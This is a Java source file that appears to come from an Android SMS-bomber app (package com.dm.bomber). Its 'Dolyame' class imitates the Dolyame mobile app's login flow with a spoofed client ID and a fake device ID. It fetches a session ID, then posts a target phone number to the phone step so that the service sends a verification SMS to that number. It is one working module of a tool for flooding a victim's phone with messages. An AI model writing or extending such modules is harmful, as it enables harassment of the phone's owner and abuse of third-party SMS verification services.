package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.Request;
import okhttp3.Response;

public class Dolyame extends Service {

    @Override
    public void run(Callback callback) {
        client.newCall(new Request.Builder()
                .url("https://id.dolyame.ru/auth/authorize")
                .post(new FormBody.Builder()
                        .add("client_id", "bnpl-mobile-app")
                        .add("redirect_uri", "mobile://")
                        .add("response_type", "code")
                        .add("response_mode", "json")
                        .add("display", "json")
                        .add("device_id", "1111111111111111")
                        .add("client_version", "2.5.0")
                        .add("vendor", "tinkoff_android")
                        .add("claims", "{\"id_token\":{\"given_name\":null, \"phone_number\": null, \"picture\": null}}")
                        .build())
                .build()).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject json = new JSONObject(response.body().string());

                    client.newCall(new Request.Builder()
                            .url("https://id.dolyame.ru/auth/step?cid=" + json.getString("cid"))
                            .header("Cookie", response.headers().get("Set-Cookie"))
                            .post(new FormBody.Builder()
                                    .add("phone", "+" + getFormattedPhone())
                                    .add("step", "phone")
                                    .build())
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    callback.onResponse(call, response);
                }
            }
        });
    }
}